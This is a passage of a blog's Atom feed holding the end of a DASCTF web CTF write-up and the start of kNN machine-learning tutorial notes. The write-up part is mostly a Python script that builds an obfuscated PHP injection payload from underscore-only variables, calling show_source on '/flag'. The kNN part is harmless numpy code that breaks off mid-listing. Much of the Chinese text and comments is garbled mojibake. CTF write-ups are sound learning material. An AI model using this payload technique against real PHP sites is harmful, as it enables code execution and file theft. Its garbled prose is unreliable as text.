class="string">&quot;_&quot;</span> * (len(payload) + offset + <span class="number">15</span>))</span><br><span class="line">var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">res += var;</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> _ascii &gt; base:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(_ascii-base):</span><br><span class="line">tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">res += tmp</span><br><span class="line"></span><br><span class="line">first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(payload)):</span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line"><span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.æ„é€ STRTOLOWERå¹¶å­˜è¿›å˜é‡a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.æ„é€ SHOW_SOURCEå¹¶å­˜è¿›å˜é‡b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.æ„é€ /FLAGå¹¶å­˜è¿›å˜é‡c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å£°æ˜å¥½abcå˜é‡</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.å˜é‡d = a(c) åˆ™å˜é‡dä¸º/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) å³ä¸ºSHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"></span><br><span class="line">print(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="ezflask">ezflask</h2><h3 id="TODO">TODO</h3><h2 id="Reference">Reference</h2><p><a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p><p><a href="http://phoebe233.cn/?p=248">http://phoebe233.cn/?p=248</a></p><p><a href="https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/">https://rce.moe/2020/08/25/GeekPwn-2020-äº‘ä¸ŠæŒ‘æˆ˜èµ›-cosplay-writeup/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå…«æœˆèµ›-Web-Writeup&quot;&gt;DASCTFå…«æœˆèµ› Web Writeup&lt;/h1&gt;
&lt;h2 id=&quot;å®‰æ’å¤§å­¦&quot;&gt;å®‰æ’å¤§å­¦&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æ¸—é€æµ‹è¯•&lt;/li&gt;
&lt;li&gt;SQLæŠ¥é”™æ³¨å…¥&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNN</title>
    <link href="http://ca0y1h.top/1.%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94KNN/"/>
    <id>http://ca0y1h.top/1.%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94KNN/</id>
    <published>2020-09-03T11:08:29.000Z</published>
    <updated>2020-09-10T12:13:57.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNNç®—æ³•">ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNNç®—æ³•</h1><blockquote><p>å‚è€ƒï¼š<a href="https://cuijiahua.com/blog/2017/11/ml_1_knn.html">https://cuijiahua.com/blog/2017/11/ml_1_knn.html</a></p></blockquote><h2 id="0x01-ä»€ä¹ˆæ˜¯KNN">0x01 ä»€ä¹ˆæ˜¯KNN</h2><h3 id="kNNç®€ä»‹">kNNç®€ä»‹</h3><p>kNN(k-nearest neighbor, k-NN)ï¼Œå³kè¿‘é‚»æ³•ã€‚å·¥ä½œåŸç†ï¼š</p><blockquote><p>å­˜åœ¨ä¸€ä¸ªæ ·æœ¬æ•°æ®é›†åˆï¼Œä¹Ÿç§°ä½œä¸ºè®­ç»ƒæ ·æœ¬é›†ï¼Œå¹¶ä¸”æ ·æœ¬é›†ä¸­æ¯ä¸ªæ•°æ®éƒ½å­˜åœ¨æ ‡ç­¾ï¼Œå³æˆ‘ä»¬çŸ¥é“æ ·æœ¬é›†ä¸­æ¯ä¸€ä¸ªæ•°æ®ä¸æ‰€å±åˆ†ç±»çš„å¯¹åº”å…³ç³»ã€‚è¾“å…¥æ²¡æœ‰æ ‡ç­¾çš„æ–°æ•°æ®åï¼Œå°†æ–°çš„æ•°æ®çš„æ¯ä¸ªç‰¹å¾ä¸æ ·æœ¬é›†ä¸­æ•°æ®å¯¹åº”çš„ç‰¹å¾è¿›è¡Œæ¯”è¾ƒï¼Œç„¶åç®—æ³•æå–æ ·æœ¬æœ€ç›¸ä¼¼æ•°æ®(æœ€è¿‘é‚»)çš„åˆ†ç±»æ ‡ç­¾ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åªé€‰æ‹©æ ·æœ¬æ•°æ®é›†ä¸­å‰kä¸ªæœ€ç›¸ä¼¼çš„æ•°æ®ï¼Œè¿™å°±æ˜¯k-è¿‘é‚»ç®—æ³•ä¸­kçš„å‡ºå¤„ï¼Œé€šå¸¸kæ˜¯ä¸å¤§äº20çš„æ•´æ•°ã€‚æœ€åï¼Œé€‰æ‹©kä¸ªæœ€ç›¸ä¼¼æ•°æ®ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„åˆ†ç±»ï¼Œä½œä¸ºæ–°æ•°æ®çš„åˆ†ç±»ã€‚</p></blockquote><p>ä½¿ç”¨é€šä¿—æ˜“æ‡‚çš„è¯æ¥è®²å°±æ˜¯ï¼Œk-è¿‘é‚»ç®—æ³•é‡‡ç”¨æµ‹é‡ä¸åŒç‰¹å¾å€¼ä¹‹é—´çš„è·ç¦»æ–¹æ³•è¿›è¡Œåˆ†ç±»ã€‚</p><p>ä½¿ç”¨KNNç®—æ³•çš„æ­¥éª¤ï¼š</p><ol><li>è®¡ç®—å·²çŸ¥ç±»åˆ«æ•°æ®é›†ä¸­çš„ç‚¹ä¸å½“å‰ç‚¹ä¹‹é—´çš„è·ç¦»ï¼›</li><li>æŒ‰ç…§è·ç¦»é€’å¢æ¬¡åºæ’åºï¼›</li><li>é€‰å–ä¸å½“å‰ç‚¹è·ç¦»æœ€å°çš„kä¸ªç‚¹ï¼›</li><li>ç¡®å®šå‰kä¸ªç‚¹æ‰€åœ¨ç±»åˆ«çš„å‡ºç°é¢‘ç‡ï¼›</li><li>è¿”å›å‰kä¸ªç‚¹æ‰€å‡ºç°é¢‘ç‡æœ€é«˜çš„ç±»åˆ«ä½œä¸ºå½“å‰ç‚¹çš„é¢„æµ‹åˆ†ç±»ã€‚</li></ol><h3 id="kNNç®€å•ä¸¾ä¾‹">kNNç®€å•ä¸¾ä¾‹</h3><p>ä½¿ç”¨Pythonå®ç°k-è¿‘é‚»ç®—æ³•åˆ†ç±»ä¸€ä¸ªç”µå½±æ˜¯çˆ±æƒ…ç‰‡è¿˜æ˜¯åŠ¨ä½œç‰‡ã€‚</p><h4 id="æ•°æ®é›†">æ•°æ®é›†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span>():</span></span><br><span class="line">    group = np.array([[<span class="number">1</span>, <span class="number">101</span>], [<span class="number">5</span>, <span class="number">89</span>], [<span class="number">108</span>, <span class="number">5</span>], [<span class="number">115</span>, <span class="number">8</span>]])</span><br><span class="line">    labels = [<span class="string">&#x27;çˆ±æƒ…ç‰‡&#x27;</span>, <span class="string">&#x27;çˆ±æƒ…ç‰‡&#x27;</span>, <span class="string">&#x27;åŠ¨ä½œç‰‡&#x27;</span>, <span class="string">&#x27;åŠ¨ä½œç‰‡&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> group, labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># åˆ›å»ºæ•°æ®é›†</span></span><br><span class="line">    group, labels = createDataSet()</span><br><span class="line">    print(group)</span><br><span class="line">    print(labels)</span><br></pre></td></tr></table></figure><h4 id="kNNç®—æ³•">kNNç®—æ³•</h4><p>å‡½æ•°classify0æ˜¯kNNç®—æ³•çš„æ ¸å¿ƒæ€æƒ³å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span>():</span></span><br><span class="line">    group = np.array([[<span class="number">1</span>, <span class="number">101</span>], [<span class="number">5</span>, <span class="number">89</span>], [<span class="number">108</span>, <span class="number">5</span>], [<span class="number">115</span>, <span class="number">8</span>]])</span><br><span class="line">    labels = [<span class="string">&#x27;çˆ±æƒ…ç‰‡&#x27;</span>, <span class="string">&#x27;çˆ±æƒ…ç‰‡&#x27;</span>, <span class="string">&#x27;åŠ¨ä½œç‰‡&#x27;</span>, <span class="string">&#x27;åŠ¨ä½œç‰‡&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> group, labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify0</span>(<span class="params">inX, dataSet, labels, k</span>):</span></span><br><span class="line">    <span class="comment"># è·å–dataSizeçš„è¡Œæ•°</span></span><br><span class="line">    dataSize = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># è®¡ç®—inXä¸dataSetæ¯ä¸ªç‚¹çš„æ¨ªçºµåæ ‡çš„å·®å€¼</span></span><br><span class="line">    diffMat = np.tile(inX, (dataSize, <span class="number">1</span>)) - dataSet</span><br><span class="line">    <span class="comment"># å¹³æ–¹</span></span><br><span class="line">    sqDiffMat = diffMat**<span class="number">2</span></span><br><span class="line">    <span class="comment"># sum()æ‰€æœ‰å…ƒç´ ç›¸åŠ ï¼Œsum(0)åˆ—ç›¸åŠ ï¼Œsum(1)è¡Œç›¸åŠ </span></span><br><span class="line">    sqDistances = sqDiffMat.sum(axis=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># å¼€æ–¹</span></span><br><span class="line">    distances = sqDistances**<span class="number">0.5</span></span><br><span class="line">    <span class="comment"># è¿”å›distancesä¸­å…ƒç´ ä»å°åˆ°å¤§æ’åºåçš„ç´¢å¼•å€¼</span></span><br><span class="line">    sortedDistIndices = distances.argsort()</span><br><span class="line">    <span class="comment"># è®°å½•ç±»åˆ«æ¬¡æ•°çš„å­—å…¸</span></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="comment"># å–å‡ºæ’åºåçš„ç¬¬iä¸ªçš„ç‰¹å¾</span></span><br><span class="line">        voteIlabel = labels[sortedDistIndices[i]]</span><br><span class="line">        <span class="comment"># è®¡ç®—ç±»åˆ«æ¬¡æ•°</span></span><br><span class="line">        classCount[voteIlabel] = classCount.get(voteIlabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># æ ¹æ®å­—å…¸çš„å€¼ï¼Œå³ç±»åˆ«æ¬¡æ•°è¿›è¡Œé™åºæ’åº</span></span><br><span class="line">    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortedClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># åˆ›å»ºæ•°æ®é›†</span></span><br><span class="line">    group, labels = createDataSet()</span><br><span class="line">    <span class="comment"># æµ‹è¯•é›†</span></span><br><span class="line">    test = [<span class="number">101</span>, <span class="number">20</span>]</span><br><span class="line">    <span class="comment"># kNNåˆ†ç±»</span></span><br><span class="line">    test_class = classify0(test, group, labels, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># æ‰“å°åˆ†ç±»ç»“æœ</span></span><br><span class="line">    print(test_class)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œç¬¬16è¡Œ-23è¡Œå°±æ˜¯è®¡ç®—æ¬§æ°è·ç¦»ï¼Œå…¬å¼å¦‚ä¸‹ï¼š<br>$$<br>d = \sqrt{ (q_1 - p_1)^{2} + (q_2 - p_2)^{2} + â€¦ +(q_n - p_n)^2}<br>$$<br>ç¬¬26è¡Œ-32è¡Œå°±æ˜¯åœ¨è®¡ç®—labelsæ•°ç»„å‰kä¸ªæ•°æ®ä¸­æ¯ä¸ªç±»åˆ«çš„ä¸ªæ•°ã€‚</p><p>æœ€åè¿”å›ä¸ªæ•°æœ€å¤šçš„é‚£ä¸ªç±»åˆ«ã€‚</p><h2 id="0x02-kNNå®æˆ˜ä¹‹çº¦ä¼šç½‘ç«™é…å¯¹æ•ˆæœåˆ¤å®š">0x02 kNNå®æˆ˜ä¹‹çº¦ä¼šç½‘ç«™é…å¯¹æ•ˆæœåˆ¤å®š</h2><h3 id="ä¸€èˆ¬æµç¨‹">ä¸€èˆ¬æµç¨‹</h3><ol><li>æ”¶é›†æ•°æ®ï¼šå¯ä»¥ä½¿ç”¨çˆ¬è™«è¿›è¡Œæ•°æ®çš„æ”¶é›†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹æä¾›çš„å…è´¹æˆ–æ”¶è´¹çš„æ•°æ®ã€‚ä¸€èˆ¬æ¥è®²ï¼Œæ•°æ®æ”¾åœ¨txtæ–‡æœ¬æ–‡ä»¶ä¸­ï¼ŒæŒ‰ç…§ä¸€å®šçš„æ ¼å¼è¿›è¡Œå­˜å‚¨ï¼Œä¾¿äºè§£æåŠå¤„ç†ã€‚</li><li>å‡†å¤‡æ•°æ®ï¼šä½¿ç”¨Pythonè§£æã€é¢„å¤„ç†æ•°æ®ã€‚</li><li>åˆ†ææ•°æ®ï¼šå¯ä»¥ä½¿ç”¨å¾ˆå¤šæ–¹æ³•å¯¹æ•°æ®è¿›è¡Œåˆ†æï¼Œä¾‹å¦‚ä½¿ç”¨Matplotlibå°†æ•°æ®å¯è§†åŒ–ã€‚</li><li>æµ‹è¯•ç®—æ³•ï¼šè®¡ç®—é”™è¯¯ç‡ã€‚</li><li>ä½¿ç”¨ç®—æ³•ï¼šé”™è¯¯ç‡åœ¨å¯æ¥å—èŒƒå›´å†…ï¼Œå°±å¯ä»¥è¿è¡Œk-è¿‘é‚»ç®—æ³•è¿›è¡Œåˆ†ç±»ã€‚</li></ol><h3 id="æ•°æ®é›†-v2">æ•°æ®é›†</h3><p>æµ·ä¼¦å¥³å£«ä¸€ç›´ä½¿ç”¨åœ¨çº¿çº¦ä¼šç½‘ç«™å¯»æ‰¾é€‚åˆè‡ªå·±çš„çº¦ä¼šå¯¹è±¡ã€‚å°½ç®¡çº¦ä¼šç½‘ç«™ä¼šæ¨èä¸åŒçš„ä»»é€‰ï¼Œä½†å¥¹å¹¶ä¸æ˜¯å–œæ¬¢æ¯ä¸€ä¸ªäººã€‚ç»è¿‡ä¸€ç•ªæ€»ç»“ï¼Œå¥¹å‘ç°è‡ªå·±äº¤å¾€è¿‡çš„äººå¯ä»¥è¿›è¡Œå¦‚ä¸‹åˆ†ç±»ï¼š</p><ol><li>ä¸å–œæ¬¢çš„äºº</li><li>é­…åŠ›ä¸€èˆ¬çš„äºº</li><li>æå…·é­…åŠ›çš„äºº</li></ol><p>æµ·ä¼¦æ”¶é›†çº¦ä¼šæ•°æ®å·²ç»æœ‰äº†ä¸€æ®µæ—¶é—´ï¼Œå¥¹æŠŠè¿™äº›æ•°æ®å­˜æ”¾åœ¨æ–‡æœ¬æ–‡ä»¶datingTestSet.txtä¸­ï¼Œæ¯ä¸ªæ ·æœ¬æ•°æ®å æ®ä¸€è¡Œï¼Œæ€»å…±æœ‰1000è¡Œã€‚datingTestSet.txtæ•°æ®ä¸‹è½½ï¼š <a href="https://github.com/Jack-Cherish/Machine-Learning/blob/master/kNN/2.%E6%B5%B7%E4%BC%A6%E7%BA%A6%E4%BC%9A/datingTestSet.txt">æ•°æ®é›†ä¸‹è½½</a></p><p>æµ·ä¼¦æ”¶é›†çš„æ ·æœ¬æ•°æ®ä¸»è¦åŒ…å«ä»¥ä¸‹3ç§ç‰¹å¾ï¼š</p><ol><li>æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°</li><li>ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´ç™¾åˆ†æ¯”</li><li>æ¯å‘¨æ¶ˆè´¹çš„å†°æ·‡æ·‹å…¬å‡æ•°</li></ol><p>éƒ¨åˆ†æ•°æ®é›†å±•ç¤ºï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200904160644.png" style="zoom:50%;" /><h3 id="æ•°æ®è§£æ">æ•°æ®è§£æ</h3><p>åœ¨å°†ä¸Šè¿°ç‰¹å¾æ•°æ®è¾“å…¥åˆ°åˆ†ç±»å™¨å‰ï¼Œå¿…é¡»å°†å¾…å¤„ç†çš„æ•°æ®çš„æ ¼å¼æ”¹å˜ä¸ºåˆ†ç±»å™¨å¯ä»¥æ¥æ”¶çš„æ ¼å¼ã€‚</p><p>ä¸»è¦æ˜¯ä¸¤ä¸ªçŸ©é˜µï¼Œå³ç‰¹å¾çŸ©é˜µå’Œå¯¹åº”çš„åˆ†ç±»æ ‡ç­¾å‘é‡ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆç¼–å†™å‡½æ•°file2matrixå°è¯•è§£ææ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file2matrix</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filename) <span class="keyword">as</span> fr:</span><br><span class="line">        <span class="comment"># è¯»å–æ•°æ®é›†</span></span><br><span class="line">        array0Lines = fr.readlines()</span><br><span class="line">        <span class="comment"># æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ®</span></span><br><span class="line">        numberOfLines = len(array0Lines)</span><br><span class="line">        <span class="comment"># ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼</span></span><br><span class="line">        returnMat = np.zeros((numberOfLines, <span class="number">3</span>))</span><br><span class="line">        <span class="comment"># åˆ†ç±»æ ‡ç­¾å‘é‡</span></span><br><span class="line">        classLableVector = []</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> array0Lines:</span><br><span class="line">            <span class="comment"># åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾</span></span><br><span class="line">            listFromLine = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="comment"># å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ</span></span><br><span class="line">            returnMat[index, :] = listFromLine[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">            <span class="comment"># å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º</span></span><br><span class="line">            label = listFromLine[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> label == <span class="string">&#x27;didntLike&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;smallDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> label == <span class="string">&#x27;largeDoses&#x27;</span>:</span><br><span class="line">                classLableVector.append(<span class="number">3</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> returnMat, classLableVector</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filename = <span class="string">&#x27;datingTestSet.txt&#x27;</span></span><br><span class="line">    datingDataMat, datingLabels = file2matrix(filename)</span><br><span class="line">    print(datingDataMat)</span><br><span class="line">    print(datingLabels)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200904162054.png" alt=""></p><h3 id="æ•°æ®å¯è§†åŒ–">æ•°æ®å¯è§†åŒ–</h3><p>ç¼–å†™showdataså‡½æ•°å°†æ•°æ®å¯è§†åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 